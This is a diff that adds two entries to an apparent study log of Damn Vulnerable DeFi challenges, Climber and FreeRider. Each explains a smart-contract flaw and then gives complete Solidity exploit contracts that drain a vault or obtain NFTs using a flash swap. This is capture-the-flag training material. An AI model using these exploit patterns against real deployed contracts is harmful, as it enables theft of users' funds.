@@ -484,4 +484,188 @@ contract PuppetV2Exploit {
     }
 ```
 
+### 2024.09.05
+
+- Damn Vulnerable DeFi: Climber
+
+#### Climber
+
+Issue:
+
+The main issue should related to the CHECK-EFFECT-PATTERN broken, which allows anyone run function call first then check the operation validity:
+```solidity
+        bytes32 id = getOperationId(targets, values, dataElements, salt);
+
+        for (uint8 i = 0; i < targets.length; ++i) {
+            targets[i].functionCallWithValue(dataElements[i], values[i]);
+        }
+
+        if (getOperationState(id) != OperationState.ReadyForExecution) {
+            revert NotReadyForExecution(id);
+        }
+```
+
+Solve: 
+
+```solidity
+contract ClimberExploit{
+
+    address payable timeLock;
+    address token;
+    address vault;
+    address player;
+    address recovery;
+
+    address[] targets;
+    uint256[] values;
+    bytes[] dataElements;
+
+    function exploit(address payable _timeLock, address _token, address _vault, address _player, address _recovery) public {
+
+        MyImplementation mi = new MyImplementation();
+
+        timeLock = _timeLock;
+        token = _token;
+        vault = _vault;
+        player = _player;
+        recovery = _recovery;
+
+        targets = new address[](4);
+        values = new uint256[](4);
+        dataElements = new bytes[](4);
+
+        targets[0] = timeLock;
+        values[0] = 0;
+        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
+
+        targets[1] = timeLock;
+        values[1] = 0;
+        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
+
+        targets[2] = vault;
+        values[2] = 0;
+        dataElements[2] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(mi), "");
+
+        targets[3] = address(this);
+        values[3] = 0;
+        dataElements[3] = abi.encodeWithSignature("schedule()");
+
+        ClimberTimelock(timeLock).execute(targets, values, dataElements, bytes32(0));
+
+        MyImplementation(address(vault)).drain(address(token), recovery);
+
+    }
+
+
+    function schedule() public{
+        ClimberTimelock(timeLock).schedule(targets, values, dataElements, bytes32(0));
+    }
+}
+
+contract MyImplementation is ClimberVault{
+
+    function drain(address token, address receipent) public{
+        DamnValuableToken(token).transfer(receipent, DamnValuableToken(token).balanceOf(address(this)));
+    }
+
+}
+```
+
+### 2024.09.06
+
+- Damn Vulnerable DeFi: FreeRider
+
+#### FreeRider
+
+Issue:
+
+There are 2 main issues:
+1. fee check is inside _buyOne with msg.value
+   ```solidity
+       if (msg.value < priceToPay) {
+            revert InsufficientPayment();
+        }
+   ```
+2. seller payment sending to new owner
+   ```solidity
+       _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);
+    
+       // pay seller using cached token
+       payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
+   ```
+
+Solve:
+```solidity
+contract FreeRiderExploit{
+    WETH weth;
+    DamnValuableToken token;
+    IUniswapV2Factory uniswapV2Factory;
+    IUniswapV2Router02 uniswapV2Router;
+    IUniswapV2Pair uniswapPair;
+    FreeRiderNFTMarketplace marketplace;
+    DamnValuableNFT nft;
+    FreeRiderRecoveryManager recoveryManager;
+    address player;
+
+    uint256 constant NFT_PRICE = 15 ether;
+
+    constructor(
+        WETH _weth,
+        DamnValuableToken _token,
+        IUniswapV2Factory _uniswapV2Factory,
+        IUniswapV2Router02 _uniswapV2Router,
+        IUniswapV2Pair _uniswapPair,
+        FreeRiderNFTMarketplace _marketplace,
+        DamnValuableNFT _nft,
+        FreeRiderRecoveryManager _recoveryManager
+    ){
+        weth = _weth;
+        token = _token;
+        uniswapV2Factory = _uniswapV2Factory;
+        uniswapV2Router = _uniswapV2Router;
+        uniswapPair = _uniswapPair;
+        marketplace = _marketplace;
+        nft = _nft;
+        recoveryManager = _recoveryManager;
+        player = msg.sender;
+    }
+
+    function exploit() public{
+        uniswapPair.swap(NFT_PRICE, 0, address(this), "123");
+    }
+
+    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public{
+        
+        weth.withdraw(NFT_PRICE);
+
+        uint256[] memory tokenIds = new uint256[](6);
+        for (uint256 i = 0; i < 6; i++) {
+            tokenIds[i] = i;
+        }
+
+        marketplace.buyMany{value: NFT_PRICE}(tokenIds);
+
+        for (uint256 i = 0; i < 6; i++) {
+            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(player));
+        }
+
+        console.log("*** balance: ", address(this).balance);
+
+        uint256 repay = NFT_PRICE * 1004 / 1000;
+        weth.deposit{value: repay}();
+        weth.transfer(address(uniswapPair), repay);
+
+    }
+    
+    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
+```
+
+
+
+
 <!-- Content_END -->
